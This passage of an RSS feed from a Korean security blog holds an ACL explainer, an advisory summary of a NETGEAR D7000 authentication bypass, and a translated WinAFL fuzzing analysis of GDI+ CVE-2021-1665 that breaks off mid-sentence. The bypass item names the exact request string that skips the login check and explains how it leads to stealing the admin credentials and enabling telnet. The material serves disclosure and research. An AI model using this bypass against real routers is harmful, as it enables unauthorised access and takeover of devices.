&#xB54C; &#xAC10;&#xC0AC; &#xB808;&#xCF54;&#xB4DC;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294;&#xB370; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</li></ul><p><strong>DACL(&#xC784;&#xC758; &#xC811;&#xADFC; &#xC81C;&#xC5B4; &#xBAA9;&#xB85D;, Discretionary Access Control List)</strong>&#xC740; &#xBCF4;&#xC548; &#xAC1C;&#xCCB4;&#xC5D0; &#xB300;&#xD574; &#xC811;&#xADFC;&#xC774; &#xD5C8;&#xC6A9;&#xB418;&#xAC70;&#xB098; &#xAC70;&#xBD80;&#xB41C; &#xC0AC;&#xC6A9;&#xC790;, &#xC0AC;&#xC6A9;&#xC790; &#xADF8;&#xB8F9;, &#xB610;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC2DD;&#xBCC4;&#xD569;&#xB2C8;&#xB2E4;. &#xC811;&#xADFC;&#xC744; &#xC694;&#xCCAD;&#xD558;&#xBA74; DACL&#xC5D0; &#xC788;&#xB294; ACE&#xB97C; &#xD655;&#xC778;&#xD558;&#xC5EC; &#xAD8C;&#xD55C;&#xC744; &#xBD80;&#xC5EC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB54C; &#xAC1C;&#xCCB4;&#xC5D0; DACL&#xC774; &#xC5C6;&#xB294; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; &#xBAA8;&#xB4E0; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC811;&#xADFC; &#xAD8C;&#xD55C;&#xC744; &#xAC00;&#xC9C0;&#xACE0;, DACL&#xC774; &#xC788;&#xC9C0;&#xB9CC; ACE&#xAC00; &#xC5C6;&#xC744; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; &#xBAA8;&#xB4E0; &#xC811;&#xADFC;&#xC744; &#xAC70;&#xBD80;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xC678; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; ACE&#xC5D0;&#xC11C; &#xD5C8;&#xC6A9;&#xD558;&#xB294; &#xC811;&#xADFC;&#xB9CC; &#xD5C8;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC8FC;&#xC758;&#xD574;&#xC57C; &#xD560; &#xAC83;&#xC740; ACE&#xB97C; &#xC21C;&#xC11C;&#xB300;&#xB85C; &#xC77D;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC561;&#xC138;&#xC2A4; &#xAC70;&#xBD80; ACE&#xC640; &#xD5C8;&#xC6A9; ACE&#xB97C; &#xB3D9;&#xC2DC;&#xC5D0; &#xBA85;&#xC2DC;&#xD560; &#xB54C; &#xAC70;&#xBD80; ACE&#xBD80;&#xD130; &#xBA85;&#xC2DC;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p><strong>SACL(&#xC2DC;&#xC2A4;&#xD15C; &#xC811;&#xADFC; &#xC81C;&#xC5B4; &#xBAA9;&#xB85D;, System Access Control List)</strong>&#xB294; &#xBCF4;&#xC548; &#xAC1C;&#xCCB4;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xB824;&#xB294; &#xC2DC;&#xB3C4;&#xB97C; &#xAE30;&#xB85D;&#xD569;&#xB2C8;&#xB2E4;. SACL&#xC758; ACE&#xB294; &#xC811;&#xADFC; &#xC2DC;&#xB3C4;&#xAC00; &#xC2E4;&#xD328;&#xD558;&#xAC70;&#xB098; &#xC131;&#xACF5;&#xD560; &#xB54C; &#xAC10;&#xC0AC; &#xB808;&#xCF54;&#xB4DC;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Hackypedia/">Hackypedia</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/y00n-nms/">y00n_nms</category>
      
      <category domain="https://hackyboiz.github.io/tags/acl/">acl</category>
      
      <category domain="https://hackyboiz.github.io/tags/ace/">ace</category>
      
      <category domain="https://hackyboiz.github.io/tags/dacl/">dacl</category>
      
      <category domain="https://hackyboiz.github.io/tags/sacl/">sacl</category>
      
      
      <comments>https://hackyboiz.github.io/2021/09/08/y00n_nms/access-control-list/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] NetGear D7000 Authentication bypass</title>
      <link>https://hackyboiz.github.io/2021/09/07/fabu1ous/2021-09-07/</link>
      <guid>https://hackyboiz.github.io/2021/09/07/fabu1ous/2021-09-07/</guid>
      <pubDate>Tue, 07 Sep 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://ssd-disclosure.com/ssd-advisory-netgear-d7000-aut</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-netgear-d7000-authentication-bypass/">NETGEAR D7000 Authentication Bypass</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>NETGEAR D7000 Device</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>NETGEAR&#xC0AC;&#xC758; D7000 &#xB77C;&#xC6B0;&#xD130;&#xC5D0;&#xC11C; &#xC778;&#xC99D; &#xC6B0;&#xD68C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC778;&#xC99D; &#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC720;&#xC800;&#xB77C;&#xB3C4; &#xD574;&#xB2F9; &#xC81C;&#xD488;&#xC758; &#xBAA8;&#xB4E0; &#xB9AC;&#xC18C;&#xC2A4;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;  <code>setup.cgi</code> &#xD30C;&#xC77C; &#xB4F1;&#xC5D0;&#xC11C; &#xC6F9; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xC758; admin &#xACC4;&#xC815;&#xACFC; &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xB97C; &#xD0C8;&#xCDE8;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;&#xC758; <code>mini_httpd</code> &#xD38C;&#xC6E8;&#xC5B4; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB294; &#xC218;&#xC2E0;&#xD558;&#xB294; request&#xC5D0; <code>todo=PNPX_GetShareFolderList</code> &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xD574;&#xB2F9; &#xBB38;&#xC790;&#xC5F4;&#xC774; request &#xB0B4;&#xC5D0; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;&#xBA74; &#xBCC0;&#xC218; <code>DAT_0001d4ec1</code>&#xC758; &#xAC12;&#xC744; 0&#xC73C;&#xB85C; &#xCD08;&#xAE30;&#xD654;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xBCC0;&#xC218;&#xB294; &#xC694;&#xCCAD;&#xB41C; &#xB9AC;&#xC18C;&#xC2A4;&#xC5D0; &#xB300;&#xD55C; &#xC811;&#xADFC;&#xC774; &#xC778;&#xC99D; &#xC808;&#xCC28;&#xB97C; &#xAC70;&#xCCD0;&#xC57C; &#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xAC12;&#xC774; 0&#xC774;&#xB77C;&#xBA74; username &#xD639;&#xC740; &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xB97C; &#xD655;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xC694;&#xCCAD;&#xB41C; &#xB9AC;&#xC18C;&#xC2A4;&#xB97C; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;. &#xBB38;&#xC81C;&#xB294; request line&#xC5D0; <code>todo=PNPX_GetSaherFolderList</code> &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xC788;&#xB294;&#xC9C0;&#xB9CC; &#xD655;&#xC778;&#xD560; &#xBFD0; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xAC80;&#xC0AC;&#xB098; &#xD544;&#xD130;&#xB9C1;&#xC774; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xB204;&#xAD6C;&#xB098; &#xC778;&#xC99D; &#xC808;&#xCC28; &#xC5C6;&#xC774; configueration file &#xB4F1;&#xC744; &#xD3EC;&#xD568;&#xD55C; &#xD574;&#xB2F9; &#xC81C;&#xD488;&#xC758; &#xBAA8;&#xB4E0; &#xD30C;&#xC77C;&#xC744; &#xB2E4;&#xC6B4; &#xBC1B;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB354; &#xB098;&#xC544;&#xAC00; admin page&#xC5D0; &#xC811;&#xADFC;&#xD574; telnet&#xC744; &#xD65C;&#xC131;&#xD654;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xB610;&#xD55C; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/firmware/">firmware</category>
      
      <category domain="https://hackyboiz.github.io/tags/router/">router</category>
      
      <category domain="https://hackyboiz.github.io/tags/admin/">admin</category>
      
      <category domain="https://hackyboiz.github.io/tags/auth-bypass/">auth-bypass</category>
      
      
      <comments>https://hackyboiz.github.io/2021/09/07/fabu1ous/2021-09-07/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Translation] Analyzing CVE-2021-1665 - Remote Code Execution Vulnerability in Windows GDI+</title>
      <link>https://hackyboiz.github.io/2021/09/05/fabu1ous/gdi/</link>
      <guid>https://hackyboiz.github.io/2021/09/05/fabu1ous/gdi/</guid>
      <pubDate>Sun, 05 Sep 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;Microsoft Windows Graphics Dev</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Microsoft Windows Graphics Device Interface+, &#xC904;&#xC5EC;&#xC11C; GDI+&#xB294; &#xB2E4;&#xC591;&#xD55C; &#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xD504;&#xB9B0;&#xD130;&#xB098; &#xBE44;&#xB514;&#xC624; &#xB514;&#xC2A4;&#xD50C;&#xB798;&#xC774; &#xC11C;&#xB85C; &#xB2E4;&#xB978; &#xADF8;&#xB798;&#xD53D; &#xAE30;&#xB2A5;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD569;&#xB2C8;&#xB2E4;. Windows &#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xC7A5;&#xCE58; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC640; &#xAC19;&#xC740; &#xADF8;&#xB798;&#xD53D; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4;&#xC5D0; &#xC9C1;&#xC811; &#xC561;&#xC138;&#xC2A4;&#xD558;&#xC9C0; &#xC54A;&#xC9C0;&#xB9CC; GDI&#xC640; &#xC0C1;&#xD638; &#xC791;&#xC6A9;&#xD558;&#xC5EC; &#xC7A5;&#xCE58; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC640; &#xC0C1;&#xD638;&#xC791;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; Windows &#xC751;&#xC6A9;&#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0; &#xB300;&#xD55C; &#xCD94;&#xC0C1;&#xD654; &#xACC4;&#xCE35;&#xACFC; &#xBAA8;&#xB4E0; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xACF5;&#xD1B5; API &#xC9D1;&#xD569;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>GDI+&#xB294; &#xBCF5;&#xC7A1;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB2E4;&#xC591;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB41C; &#xC5ED;&#xC0AC;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. McAfee&#xB294; Windows GDI+&#xB97C; &#xD3EC;&#xD568;&#xD55C; &#xB2E4;&#xC591;&#xD55C; &#xC624;&#xD508; &#xC18C;&#xC2A4; &#xBC0F; &#xD074;&#xB85C;&#xC988;&#xB4DC; &#xC18C;&#xC2A4; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB97C; &#xC9C0;&#xC18D;&#xC801;&#xC73C;&#xB85C; &#xD37C;&#xC9D5;&#xD569;&#xB2C8;&#xB2E4;. &#xC9C0;&#xB09C; &#xBA87;&#xB144; &#xB3D9;&#xC548; GDI+&#xB97C; &#xD3EC;&#xD568;&#xD55C; &#xB2E4;&#xC591;&#xD55C; Windows &#xAD6C;&#xC131;&#xC694;&#xC18C;&#xC5D0;&#xC11C; Microsoft&#xC5D0; &#xB2E4;&#xC591;&#xD55C; &#xBB38;&#xC81C;&#xB97C; &#xBCF4;&#xACE0;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xC704;&#xD55C; CVE&#xB97C; &#xC81C;&#xACF5; &#xBC1B;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xAC8C;&#xC2DC;&#xBB3C;&#xC5D0;&#xC11C;&#xB294; WinAFL&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xBC1C;&#xACAC;&#xB41C; &#xCDE8;&#xC57D;&#xC810; &#xC911; &#xD558;&#xB098;&#xC778; CVE-2021-1665: GDI+ &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD55C; root cause &#xBD84;&#xC11D;&#xC5D0; &#xB300;&#xD574; &#xC790;&#xC138;&#xD788; &#xC124;&#xBA85;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; 2021&#xB144; 1&#xC6D4;&#xC5D0; Microsoft &#xD328;&#xCE58;&#xB85C; &#xD574;&#xACB0;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="What-is-WinAFL"><a href="#What-is-WinAFL" class="headerlink" title="What is WinAFL?"></a>What is WinAFL?</h1><p>WinAFL&#xC740; &#xB110;&#xB9AC; &#xC0AC;&#xC6A9;&#xB418;&#xB294; Linux AFL &#xD37C;&#xC800;&#xC758; Windows &#xD3EC;&#xB4DC; &#xBC84;&#xC804;&#xC774;&#xBA70; Google Project Zero&#xC758; Ivan Fratric&#xC5D0; &#xC758;&#xD574; &#xC720;&#xC9C0; &#xAD00;&#xB9AC;&#xB429;&#xB2C8;&#xB2E4;. WinAFL&#xC740; DynamoRIO&#xB97C; &#xD1B5;&#xD55C; &#xBC14;&#xC774;&#xB108;&#xB9AC; Instrumentation&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA70; Harness&#xB77C; &#xBD88;&#xB9AC;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC694;&#xAD6C;&#xD569;&#xB2C8;&#xB2E4;. Harness&#xB294; &#xC6B0;&#xB9AC;&#xAC00; &#xD37C;&#xC9D5;&#xD558;&#xACE0;&#xC790; &#xD558;&#xB294; API&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xB2E8;&#xC21C;&#xD55C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0; &#xBD88;&#xACFC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC800;&#xD76C;&#xAC00; &#xC0AC;&#xC6A9;&#xD560; Harness&#xB294; WinAFL&#xACFC; &#xD568;&#xAED8; &#xC81C;&#xACF5;&#xB429;&#xB2C8;&#xB2E4;. &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; &#xC8FC;&#xC11D; &#xCC98;&#xB9AC;&#xB41C; &#x201C;Image&#x2192;GetThumbnailImage&#x201D; &#xCF54;&#xB4DC;&#xB97C; &#xD65C;&#xC131;&#xD654;&#xD569;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC74C;&#xC740; GDI+ &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xD37C;&#xC9D5;&#xD558;&#xB294; harness &#xCF54;&#xB4DC;&#xC640; GetThumbnailImage API&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/05/fabu1ous/gdi/1.png" alt></p><p>&#xBCF4;&#xC2DC;&#xB2E4;&#xC2DC;&#xD53C; &#xC774; &#xC791;&#xC740; &#xCF54;&#xB4DC;&#xB294; &#xC81C;&#xACF5;&#xB41C; &#xC785;&#xB825; &#xD30C;&#xC77C;&#xC5D0;&#xC11C; &#xC0C8; &#xC774;&#xBBF8;&#xC9C0; &#xAC1D;&#xCCB4;&#xB97C; &#xB9CC;&#xB4E0; &#xB2E4;&#xC74C; &#xB610; &#xB2E4;&#xB978; &#xAE30;&#xB2A5;&#xC744; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xCD95;&#xC18C;&#xB41C; &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC591;&#xD55C; Windows &#xC751;&#xC6A9;&#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; &#xC378;&#xB124;&#xC77C; &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774;&#xB294; &#xC544;&#xC8FC; &#xD6CC;&#xC735;&#xD55C; &#xACF5;&#xACA9; &#xBC31;&#xD130;&#xC785;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xC0AC;&#xC6A9;&#xC790; &#xC0C1;&#xD638; &#xC791;&#xC6A9;&#xC774; &#xAC70;&#xC758; &#xD544;&#xC694;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBBC0;&#xB85C; GDI+&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; GetThumbnailImage API&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB294; &#xCDE8;&#xC57D;&#xD569;&#xB2C8;&#xB2E4;.</p><h1 id="Collecting-Corpus"><a href="#Collecting-Corpus" class="headerlink" title="Collecting Corpus:"></a>Collecting Corpus:</h1><p>&#xC88B;&#xC740; corpus&#xB294; &#xD37C;&#xC9D5;&#xC744; &#xC704;&#xD55C; &#xD0C4;&#xD0C4;&#xD55C; &#xAE30;&#xBC18;&#xC744; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;. Google&#xB610;&#xB294; Github&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xC218;&#xC9D1;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70;, &#xB2E4;&#xB978; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD574; &#xB9B4;&#xB9AC;&#xC2A4; &#xB41C; &#xB2E4;&#xC591;&#xD55C; &#xACF5;&#xC6A9; EMP &#xD30C;&#xC77C;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xCD94;&#xAC00; &#xD14C;&#xC2A4;&#xD2B8; corpus&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. Microsoft &#xC0AC;&#xC774;&#xD2B8;&#xC5D0;&#xC11C; &#xC81C;&#xACF5;&#xB41C; &#xC0D8;&#xD50C; &#xCF54;&#xB4DC;&#xB97C; &#xBCC0;&#xACBD;&#xD558;&#xC5EC; &#xBA87; &#xAC1C;&#xC758; &#xD14C;&#xC2A4;&#xD2B8; &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC74C; &#xCF54;&#xB4DC;&#xB294; EMFPlusDrawString &#xBC0F; &#xAE30;&#xD0C0; &#xB808;&#xCF54;&#xB4DC;&#xB85C; EMF &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD55C; &#xAC83; &#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/05/fabu1ous/gdi/2.png" alt></p><p>Ref: <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-emfplus/07bda2af-7a5d-4c0b-b996-30326a41fa57">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-emfplus/07bda2af-7a5d-4c0b-b996-30326a41fa57</a></p><h1 id="Minimizing-Corpus"><a href="#Minimizing-Corpus" class="headerlink" title="Minimizing Corpus:"></a>Minimizing Corpus:</h1><p>&#xCD08;&#xAE30; corpus &#xD30C;&#xC77C;&#xC744; &#xC218;&#xC9D1;&#xD55C; &#xD6C4;&#xC5D0;&#xB294; &#xCD5C;&#xC18C;&#xD654;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC704;&#xD574; winafl-cmin.py&#xB77C;&#xB294; &#xC720;&#xD2F8;&#xB9AC;&#xD2F0;&#xB97C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">winafl-cmin.py -D D:\\\\work\\\\winafl\\\\DynamoRIO\\\\bin32 -t 10000 -i inCorpus -o minCorpus -covtype edge -coverage_module gdiplus.dll -target_module gdiplus_hardik.exe -target_method fuzzMe -nargs 2 &#x2014; gdiplus_hardik.exe @@</code></pre><h1 id="How-does-WinAFL-work"><a href="#How-does-WinAFL-work" class="headerlink" title="How does WinAFL work?"></a>How does WinAFL work?</h1><p>WinAFL&#xC740; in-memory &#xD37C;&#xC9D5;&#xC774;&#xB77C;&#xB294; &#xAC1C;&#xB150;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC6B0;&#xB9AC;&#xB294; WinAFL&#xC5D0; &#xD568;&#xC218;&#xBA85;&#xC744; &#xC81C;&#xACF5;&#xD574;&#xC57C;&#xD569;&#xB2C8;&#xB2E4;. WinAFL&#xC740; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC0C1;&#xD0DC;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xACE0; corpus&#xC5D0;&#xC11C; &#xD558;&#xB098;&#xC758; &#xC785;&#xB825; &#xD30C;&#xC77C;&#xC744; &#xAC00;&#xC838;&#xC640; &#xBCC0;&#xD615;(mutate)&#xC2DC;&#xD0A4;&#xACE0; &#xD568;&#xC218;&#xC5D0; &#xACF5;&#xAE09;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB9AC;&#xACE0; &#xC0C8; &#xCF54;&#xB4DC; &#xACBD;&#xB85C;(path)&#xC5D0; &#xB3C4;&#xB2EC;&#xD558;&#xAC70;&#xB098; crash&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294;&#xC9C0; &#xBAA8;&#xB2C8;&#xD130;&#xB9C1;&#xD569;&#xB2C8;&#xB2E4;. &#xC0C8;&#xB85C;&#xC6B4; path&#xB97C; &#xCC3E;&#xC73C;&#xBA74; &#xC0C8; &#xD30C;&#xC77C;&#xC744; &#xD765;&#xBBF8;&#xB85C;&#xC6B4; &#xD14C;&#xC2A4;&#xD2B8; &#xC0AC;&#xB840;&#xB85C; &#xAC04;&#xC8FC;&#xD558;&#xACE0; &#xCD94;&#xAC00; mutate &#xBD80;&#xD638;&#xB85C; &#xB300;&#xAE30;&#xC5F4;&#xC5D0; &#xC313;&#xC2B5;&#xB2C8;&#xB2E4;. crash&#xB97C; &#xBC1C;&#xACAC;&#xD558;&#xBA74; crashes &#xD3F4;&#xB354;&#xC5D0; crash&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A4;&#xB294; &#xD30C;&#xC77C;&#xC744; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC74C; &#xADF8;&#xB9BC;&#xC740; &#xD37C;&#xC9D5; &#xD504;&#xB984;&#xC744; &#xBCF4;&#xC5EC;&#xC90D;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/05/fabu1ous/gdi/3.png" alt></p><h1 id="Fuzzing-with-WinAFL"><a href="#Fuzzing-with-WinAFL" class="headerlink" title="Fuzzing with WinAFL:"></a>Fuzzing with WinAFL:</h1><p>Harness &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xCEF4;&#xD30C;&#xC77C;&#xD558;&#xACE0;, corpus&#xB97C; &#xC218;&#xC9D1;&#xD558;&#xACE0;, &#xCD5C;&#xC18C;&#xD654;&#xD55C; &#xD6C4;&#xC5D0;&#xB294; &#xC544;&#xB798; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xC5EC; WinAFL&#xB85C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xD37C;&#xC9D5; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">afl-fuzz.exe -i minCorpus -o out -D D:\\work\\winafl\\DynamoRIO\\bin32 -t 20000 &#x2014;coverage_module gdiplus.dll -fuzz_iterations 5000 -target_module gdiplus_hardik.exe -target_offset 0x16e0 -nargs 2 &#x2014; gdiplus_hardik.exe @@</code></pre><h1 id="Results"><a href="#Results" class="headerlink" title="Results:"></a>Results:</h1><p>&#xBA87; &#xBC88;&#xC758; &#xCDA9;&#xB3CC;&#xACFC; &#xB3C5;&#xD2B9;&#xD55C; &#xCDA9;&#xB3CC; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xAC70;&#xCE5C; &#xD6C4; &#x201C;gdiplus!BuiltLine::GetBaselineOffset&#x201D;&#xC5D0;&#xC11C; carsh&#xB97C; &#xBC1C;&#xACAC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. callstack&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/05/fabu1ous/gdi/4.png" alt></p><p>&#xC704;&#xC758; &#xC774;&#xBBF8;&#xC9C0;&#xC5D0;&#xC11C; &#xBCFC; &#xC218; &#xC788;&#xB4EF;&#xC774; edx+8&#xB85C; &#xAC00;&#xB9AC;&#xD0A8; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xC73C;&#xB824; &#xD560; &#xB54C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC911;&#xB2E8;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. ebx, ecx &#xBC0F; edx&#xC5D0; c0c0c0c0&#xC774; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC989;, &#xD398;&#xC774;&#xC9C0; &#xD799;&#xC774; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB3C4;&#xB85D; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; c0c0c0c0&#xC774; &#x201C;gdiplus!FullTextImager::RenderLine&#x201D; &#xD568;&#xC218;&#xC5D0; &#xB9E4;&#xAC1C; &#xBCC0;&#xC218;&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xACE0; &#xC788;&#xC74C;&#xC744; 